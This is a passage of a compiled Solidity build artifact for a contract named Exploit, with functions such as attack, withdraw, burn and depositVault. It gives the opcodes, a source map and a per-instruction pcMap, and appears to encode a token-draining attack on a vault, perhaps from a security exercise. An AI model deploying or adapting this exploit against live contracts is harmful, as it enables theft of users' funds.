:12;1278:52;1365:9;1352:23;1384:31;1409:5;1384:31;:::i;1450:184::-;1520:6;1573:2;1561:9;1552:7;1548:23;1544:32;1541:52;;;1589:1;1586;1579:12;1541:52;-1:-1:-1;1612:16:1;;1450:184;-1:-1:-1;1450:184:1:o;1639:315::-;1707:6;1715;1768:2;1756:9;1747:7;1743:23;1739:32;1736:52;;;1784:1;1781;1774:12;1736:52;1820:9;1807:23;1797:33;;1880:2;1869:9;1865:18;1852:32;1893:31;1918:5;1893:31;:::i;:::-;1943:5;1933:15;;;1639:315;;;;;:::o;3695:131::-;-1:-1:-1;;;;;3770:31:1;;3760:42;;3750:70;;3816:1;3813;3806:12",
  "language": "Solidity",
  "natspec": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "offset": [
    505,
    1456
  ],
  "opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x62 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x3CCFD60B EQ PUSH2 0x67 JUMPI DUP1 PUSH4 0x6F307DC3 EQ PUSH2 0x71 JUMPI DUP1 PUSH4 0x7BEA12F5 EQ PUSH2 0x91 JUMPI DUP1 PUSH4 0x9DC29FAC EQ PUSH2 0xA4 JUMPI DUP1 PUSH4 0xBDB2321F EQ PUSH2 0xCA JUMPI DUP1 PUSH4 0xBEBBF4D0 EQ PUSH2 0xDD JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x6F PUSH2 0xF9 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x1 SLOAD PUSH1 0x40 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND DUP2 MSTORE PUSH1 0x20 ADD JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x6F PUSH2 0x9F CALLDATASIZE PUSH1 0x4 PUSH2 0x3CF JUMP JUMPDEST PUSH2 0x202 JUMP JUMPDEST PUSH2 0xBA PUSH2 0xB2 CALLDATASIZE PUSH1 0x4 PUSH2 0x37A JUMP JUMPDEST PUSH1 0x1 SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x40 MLOAD SWAP1 ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x88 JUMP JUMPDEST PUSH2 0x6F PUSH2 0xD8 CALLDATASIZE PUSH1 0x4 PUSH2 0x41A JUMP JUMPDEST PUSH2 0x341 JUMP JUMPDEST PUSH2 0xEB PUSH2 0xB2 CALLDATASIZE PUSH1 0x4 PUSH2 0x450 JUMP JUMPDEST PUSH1 0x40 MLOAD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x88 JUMP JUMPDEST PUSH1 0x1 SLOAD PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP3 DUP4 AND SWAP3 PUSH4 0xA9059CBB SWAP3 AND SWAP1 DUP4 SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x149 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x15D JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x181 SWAP2 SWAP1 PUSH2 0x437 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB NOT PUSH1 0xE0 DUP6 SWAP1 SHL AND DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND PUSH1 0x4 DUP4 ADD MSTORE PUSH1 0x24 DUP3 ADD MSTORE PUSH1 0x44 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1C7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x1DB JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x1FF SWAP2 SWAP1 PUSH2 0x3A6 JUMP JUMPDEST POP JUMP JUMPDEST PUSH2 0x20B DUP2 PUSH2 0x341 JUMP JUMPDEST PUSH1 0x1 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP5 DUP2 AND PUSH1 0x4 DUP4 ADD MSTORE DUP6 DUP2 AND SWAP3 PUSH4 0x8D7D3EEA SWAP3 DUP7 SWAP3 ADDRESS SWAP3 CALLER SWAP3 SWAP2 AND SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x25F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x273 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x297 SWAP2 SWAP1 PUSH2 0x437 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0xE0 DUP7 SWAP1 SHL PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB NOT AND DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP5 DUP6 AND PUSH1 0x4 DUP3 ADD MSTORE SWAP3 DUP5 AND PUSH1 0x24 DUP5 ADD MSTORE SWAP3 AND PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 DUP2 ADD SWAP2 SWAP1 SWAP2 MSTORE PUSH9 0x56BC75E2D63100000 PUSH1 0x84 DUP3 ADD MSTORE PUSH1 0x0 PUSH1 0xA4 DUP3 ADD DUP2 SWAP1 MSTORE PUSH1 0xC4 DUP3 ADD DUP2 SWAP1 MSTORE PUSH1 0xE4 DUP3 ADD MSTORE PUSH1 0x38 PUSH2 0x104 DUP3 ADD MSTORE PUSH2 0x124 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x31C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x330 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH2 0x33C PUSH2 0xF9 JUMP JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x0 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND CALLER EQ PUSH2 0x358 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x1 DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP3 SWAP1 SWAP3 AND SWAP2 SWAP1 SWAP2 OR SWAP1 SSTORE JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0x38D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP3 CALLDATALOAD PUSH2 0x398 DUP2 PUSH2 0x480 JUMP JUMPDEST SWAP5 PUSH1 0x20 SWAP4 SWAP1 SWAP4 ADD CALLDATALOAD SWAP4 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x3B8 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 MLOAD DUP1 ISZERO ISZERO DUP2 EQ PUSH2 0x3C8 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 PUSH1 0x60 DUP5 DUP7 SUB SLT ISZERO PUSH2 0x3E4 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP4 CALLDATALOAD PUSH2 0x3EF DUP2 PUSH2 0x480 JUMP JUMPDEST SWAP3 POP PUSH1 0x20 DUP5 ADD CALLDATALOAD PUSH2 0x3FF DUP2 PUSH2 0x480 JUMP JUMPDEST SWAP2 POP PUSH1 0x40 DUP5 ADD CALLDATALOAD PUSH2 0x40F DUP2 PUSH2 0x480 JUMP JUMPDEST DUP1 SWAP2 POP POP SWAP3 POP SWAP3 POP SWAP3 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x42C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 CALLDATALOAD PUSH2 0x3C8 DUP2 PUSH2 0x480 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x449 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0x463 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP3 CALLDATALOAD SWAP2 POP PUSH1 0x20 DUP4 ADD CALLDATALOAD PUSH2 0x475 DUP2 PUSH2 0x480 JUMP JUMPDEST DUP1 SWAP2 POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND DUP2 EQ PUSH2 0x1FF JUMPI PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xE8 PC CODESIZE AND SWAP11 0xF7 SUB PUSH30 0x9F31776F79C1F3E829B05A59A960CF24552691070E7715D764736F6C6343 STOP ADDMOD SMOD STOP CALLER ",
  "pcMap": {
    "0": {
      "offset": [
        505,
        1456
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x80"
    },
    "2": {
      "fn": null,
      "offset": [
        505,
        1456
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "4": {
      "fn": null,
      "offset": [
        505,
        1456
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "5": {
      "fn": null,
      "offset": [
        505,
        1456
      ],
      "op": "CALLVALUE",
      "path": "0"
    },
    "6": {
      "fn": null,
      "offset": [
        505,
        1456
      ],
      "op": "DUP1",
      "path": "0"
    },
    "7": {
      "fn": null,
      "offset": [
        505,
        1456
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "8": {
      "fn": null,
      "offset": [
        505,
        1456
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x10"
    },
    "11": {
      "fn": null,
      "offset": [
        505,
        1456
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "12": {
      "fn": null,
      "offset": [
        505,
        1456
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "14": {
      "fn": null,
      "offset": [
        505,
        1456
      ],
      "op": "DUP1",
      "path": "0"
    },
    "15": {
      "dev": "Cannot send ether to nonpayable function",
      "fn": null,
      "offset": [
        505,
        1456
      ],
      "op": "REVERT",
      "path": "0"
    },
    "16": {
      "fn": null,
      "offset": [
        505,
        1456
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "17": {
      "fn": null,
      "offset": [
        505,
        1456
      ],
      "op": "POP",
      "path": "0"
    },
    "18": {
      "fn": null,
      "offset": [
        505,
        1456
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "20": {
      "fn": null,
      "offset": [
        505,
        1456
      ],
      "op": "CALLDATASIZE",
      "path": "0"
    },
    "21": {
      "fn": null,
      "offset": [
        505,
        1456
      ],
      "op": "LT",
      "path": "0"
    },
    "22": {
      "fn": null,
      "offset": [
        505,
        1456
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x62"
    },
    "25": {
      "fn": null,
      "offset": [
        505,
        1456
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "26": {
      "fn": null,
      "offset": [
        505,
        1456
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "28": {
      "fn": null,
      "offset": [
        505,
        1456
      ],
      "op": "CALLDATALOAD",
      "path": "0"
    },
    "29": {
      "fn": null,
      "offset": [
        505,
        1456
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0xE0"
    },
    "31": {
      "fn": null,
      "offset": [
        505,
        1456
      ],
      "op": "SHR",
      "path": "0"
    },
    "32": {
      "fn": null,
      "offset": [
        505,
        1456
      ],
      "op": "DUP1",
      "path": "0"
    },
    "33": {
      "fn": null,
      "offset": [
        505,
        1456
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x3CCFD60B"
    },
    "38": {
      "fn": null,
      "offset": [
        505,
        1456
      ],
      "op": "EQ",
      "path": "0"
    },
    "39": {
      "fn": null,
      "offset": [
        505,
        1456
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x67"
    },
    "42": {
      "fn": null,
      "offset": [
        505,
        1456
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "43": {
      "fn": null,
      "offset": [
        505,
        1456
      ],
      "op": "DUP1",
      "path": "0"
    },
    "44": {
      "fn": null,
      "offset": [
        505,
        1456
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x6F307DC3"
    },
    "49": {
      "fn": null,
      "offset": [
        505,
        1456
      ],
      "op": "EQ",
      "path": "0"
    },
    "50": {
      "fn": null,
      "offset": [
        505,
        1456
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x71"
    },
    "53": {
      "fn": null,
      "offset": [
        505,
        1456
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "54": {
      "fn": null,
      "offset": [
        505,
        1456
      ],
      "op": "DUP1",
      "path": "0"
    },
    "55": {
      "fn": null,
      "offset": [
        505,
        1456
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x7BEA12F5"
    },
    "60": {
      "fn": null,
      "offset": [
        505,
        1456
      ],
      "op": "EQ",
      "path": "0"
    },
    "61": {
      "fn": null,
      "offset": [
        505,
        1456
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x91"
    },
    "64": {
      "fn": null,
      "offset": [
        505,
        1456
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "65": {
      "fn": null,
      "offset": [
        505,
        1456
      ],
      "op": "DUP1",
      "path": "0"
    },
    "66": {
      "fn": null,
      "offset": [
        505,
        1456
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x9DC29FAC"
    },
    "71": {
      "fn": null,
      "offset": [
        505,
        1456
      ],
      "op": "EQ",
      "path": "0"
    },
    "72": {
      "fn": null,
      "offset": [
        505,
        1456
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xA4"
    },
    "75": {
      "fn": null,
      "offset": [
        505,
        1456
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "76": {
      "fn": null,
      "offset": [
        505,
        1456
      ],
      "op": "DUP1",
      "path": "0"
    },
    "77": {
      "fn": null,
      "offset": [
        505,
        1456
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0xBDB2321F"
    },
    "82": {
      "fn": null,
      "offset": [
        505,
        1456
      ],
      "op": "EQ",
      "path": "0"
    },
    "83": {
      "fn": null,
      "offset": [
        505,
        1456
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xCA"
    },
    "86": {
      "fn": null,
      "offset": [
        505,
        1456
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "87": {
      "fn": null,
      "offset": [
        505,
        1456
      ],
      "op": "DUP1",
      "path": "0"
    },
    "88": {
      "fn": null,
      "offset": [
        505,
        1456
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0xBEBBF4D0"
    },
    "93": {
      "fn": null,
      "offset": [
        505,
        1456
      ],
      "op": "EQ",
      "path": "0"
    },
    "94": {
      "fn": null,
      "offset": [
        505,
        1456
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xDD"
    },
    "97": {
      "fn": null,
      "offset": [
        505,
        1456
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "98": {
      "fn": null,
      "offset": [
        505,
        1456
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "99": {
      "fn": null,
      "offset": [
        505,
        1456
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "101": {
      "fn": null,
      "offset": [
        505,
        1456
      ],
      "op": "DUP1",
      "path": "0"
    },
    "102": {
      "first_revert": true,
      "fn": null,
      "offset": [
        505,
        1456
      ],
      "op": "REVERT",
      "path": "0"
    },
    "103": {
      "fn": "Exploit.withdraw",
      "offset": [
        1051,
        1147
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "104": {
      "fn": "Exploit.withdraw",
      "offset": [
        1051,
        1147
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x6F"
    },
    "107": {
      "fn": "Exploit.withdraw",
      "offset": [
        1051,
        1147
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xF9"
    },
    "110": {
      "fn": "Exploit.withdraw",
      "jump": "i",
      "offset": [
        1051,
        1147
      ],
      "op": "JUMP",
      "path": "0"
    },
    "111": {
      "fn": "Exploit.withdraw",
      "offset": [
        1051,
        1147
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "112": {
      "fn": "Exploit.withdraw",
      "offset": [
        1051,
        1147
      ],
      "op": "STOP",
      "path": "0"
    },
    "113": {
      "fn": "Exploit.underlying",
      "offset": [
        637,
        727
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "114": {
      "fn": "Exploit.underlying",
      "offset": [
        714,
        719
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 0,
      "value": "0x1"
    },
    "116": {
      "fn": "Exploit.underlying",
      "offset": [
        714,
        719
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "117": {
      "fn": "Exploit.underlying",
      "offset": [
        637,
        727
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "119": {
      "fn": "Exploit.underlying",
      "offset": [
        637,
        727
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "120": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "122": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "124": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "126": {
      "op": "SHL"
    },
    "127": {
      "op": "SUB"
    },
    "128": {
      "fn": "Exploit.underlying",
      "offset": [
        714,
        719
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "129": {
      "fn": "Exploit.underlying",
      "offset": [
        714,
        719
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "130": {
      "fn": "Exploit.underlying",
      "offset": [
        714,
        719
      ],
      "op": "AND",
      "path": "0"
    },
    "131": {
      "op": "DUP2"
    },
    "132": {
      "op": "MSTORE"
    },
    "133": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "135": {
      "op": "ADD"
    },
    "136": {
      "fn": "Exploit.underlying",
      "offset": [
        637,
        727
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "137": {
      "fn": "Exploit.underlying",
      "offset": [
        637,
        727
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "139": {
      "fn": "Exploit.underlying",
      "offset": [
        637,
        727
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "140": {
      "fn": "Exploit.underlying",
      "offset": [
        637,
        727
      ],
      "op": "DUP1",
      "path": "0"
    },
    "141": {
      "fn": "Exploit.underlying",
      "offset": [
        637,
        727
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "142": {
      "fn": "Exploit.underlying",
      "offset": [
        637,
        727
      ],
      "op": "SUB",
      "path": "0"
    },
    "143": {
      "fn": "Exploit.underlying",
      "offset": [
        637,
        727
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "144": {
      "fn": "Exploit.underlying",
      "offset": [
        637,
        727
      ],
      "op": "RETURN",
      "path": "0"
    },
    "145": {
      "fn": "Exploit.attack",
      "offset": [
        1153,
        1453
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "146": {
      "fn": "Exploit.attack",
      "offset": [
        1153,
        1453
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x6F"
    },
    "149": {
      "fn": "Exploit.attack",
      "offset": [
        1153,
        1453
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x9F"
    },
    "152": {
      "fn": "Exploit.attack",
      "offset": [
        1153,
        1453
      ],
      "op": "CALLDATASIZE",
      "path": "0"
    },
    "153": {
      "fn": "Exploit.attack",
      "offset": [
        1153,
        1453
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "155": {
      "fn": "Exploit.attack",
      "offset": [
        1153,
        1453
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x3CF"
    },
    "158": {
      "fn": "Exploit.attack",
      "jump": "i",
      "offset": [
        1153,
        1453
      ],
      "op": "JUMP",
      "path": "0"
    },
    "159": {
      "fn": "Exploit.attack",
      "offset": [
        1153,
        1453
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "160": {
      "fn": "Exploit.attack",
      "offset": [
        1153,
        1453
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x202"
    },
    "163": {
      "fn": "Exploit.attack",
      "jump": "i",
      "offset": [
        1153,
        1453
      ],
      "op": "JUMP",
      "path": "0"
    },
    "164": {
      "fn": "Exploit.burn",
      "offset": [
        732,
        827
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "165": {
      "fn": "Exploit.burn",
      "offset": [
        732,
        827
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xBA"
    },
    "168": {
      "fn": "Exploit.burn",
      "offset": [
        732,
        827
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xB2"
    },
    "171": {
      "fn": "Exploit.burn",
      "offset": [
        732,
        827
      ],
      "op": "CALLDATASIZE",
      "path": "0"
    },
    "172": {
      "fn": "Exploit.burn",
      "offset": [
        732,
        827
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "174": {
      "fn": "Exploit.burn",
      "offset": [
        732,
        827
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x37A"
    },
    "177": {
      "fn": "Exploit.burn",
      "jump": "i",
      "offset": [
        732,
        827
      ],
      "op": "JUMP",
      "path": "0"
    },
    "178": {
      "fn": "Exploit.burn",
      "offset": [
        732,
        827
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "179": {
      "fn": "Exploit.burn",
      "offset": [
        816,
        820
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 1,
      "value": "0x1"
    },
    "181": {
      "fn": "Exploit.burn",
      "offset": [
        732,
        827
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "182": {
      "fn": "Exploit.burn",
      "offset": [
        732,
        827
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "183": {
      "fn": "Exploit.burn",
      "offset": [
        732,
        827
      ],
      "op": "POP",
      "path": "0"
    },
    "184": {
      "fn": "Exploit.burn",
      "offset": [
        732,
        827
      ],
      "op": "POP",
      "path": "0"
    },
    "185": {
      "fn": "Exploit.burn",
      "offset": [
        732,
        827
      ],
      "op": "JUMP",
      "path": "0"
    },
    "186": {
      "fn": "Exploit.burn",
      "offset": [
        732,
        827
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "187": {
      "fn": "Exploit.burn",
      "offset": [
        732,
        827
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "189": {
      "fn": "Exploit.burn",
      "offset": [
        732,
        827
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "190": {
      "op": "SWAP1"
    },
    "191": {
      "op": "ISZERO"
    },
    "192": {
      "op": "ISZERO"
    },
    "193": {
      "op": "DUP2"
    },
    "194": {
      "op": "MSTORE"
    },
    "195": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "197": {
      "op": "ADD"
    },
    "198": {
      "fn": "Exploit.burn",
      "offset": [
        732,
        827
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x88"
    },
    "201": {
      "op": "JUMP"
    },
    "202": {
      "fn": "Exploit.setUnderlying",
      "offset": [
        933,
        1045
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "203": {
      "fn": "Exploit.setUnderlying",
      "offset": [
        933,
        1045
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x6F"
    },
    "206": {
      "fn": "Exploit.setUnderlying",
      "offset": [
        933,
        1045
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xD8"
    },
    "209": {
      "fn": "Exploit.setUnderlying",
      "offset": [
        933,
        1045
      ],
      "op": "CALLDATASIZE",
      "path": "0"
    },
    "210": {
      "fn": "Exploit.setUnderlying",
      "offset": [
        933,
        1045
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "212": {
      "fn": "Exploit.setUnderlying",
      "offset": [
        933,
        1045
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x41A"
    },
    "215": {
      "fn": "Exploit.setUnderlying",
      "jump": "i",
      "offset": [
        933,
        1045
      ],
      "op": "JUMP",
      "path": "0"
    },
    "216": {
      "fn": "Exploit.setUnderlying",
      "offset": [
        933,
        1045
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "217": {
      "fn": "Exploit.setUnderlying",
      "offset": [
        933,
        1045
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x341"
    },
    "220": {
      "fn": "Exploit.setUnderlying",
      "jump": "i",
      "offset": [
        933,
        1045
      ],
      "op": "JUMP",
      "path": "0"
    },
    "221": {
      "fn": "Exploit.depositVault",
      "offset": [
        832,
        927
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "222": {
      "fn": "Exploit.depositVault",
      "offset": [
        832,
        927
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xEB"
    },
    "225": {
      "fn": "Exploit.depositVault",
      "offset": [
        832,
        927
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xB2"
    },
    "228": {
      "fn": "Exploit.depositVault",
      "offset": [
        832,
        927
      ],
      "op": "CALLDATASIZE",
      "path": "0"
    },
    "229": {
      "fn": "Exploit.depositVault",
      "offset": [
        832,
        927
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "231": {
      "fn": "Exploit.depositVault",
      "offset": [
        832,
        927
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x450"
    },
    "234": {
      "fn": "Exploit.depositVault",
      "jump": "i",
      "offset": [
        832,
        927
      ],
      "op": "JUMP",
      "path": "0"
    },
    "235": {
      "fn": "Exploit.depositVault",
      "offset": [
        832,
        927
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "236": {
      "fn": "Exploit.depositVault",
      "offset": [
        832,
        927
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "238": {
      "fn": "Exploit.depositVault",
      "offset": [
        832,
        927
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "239": {
      "op": "SWAP1"
    },
    "240": {
      "op": "DUP2"
    },
    "241": {
      "op": "MSTORE"
    },
    "242": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "244": {
      "op": "ADD"
    },
    "245": {
      "fn": "Exploit.depositVault",
      "offset": [
        832,
        927
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x88"
    },
    "248": {
      "op": "JUMP"
    },
    "249": {
      "fn": "Exploit.withdraw",
      "offset": [
        1051,
        1147
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "250": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1093
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 2,
      "value": "0x1"
    },
    "252": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1093
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "253": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1093
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "255": {
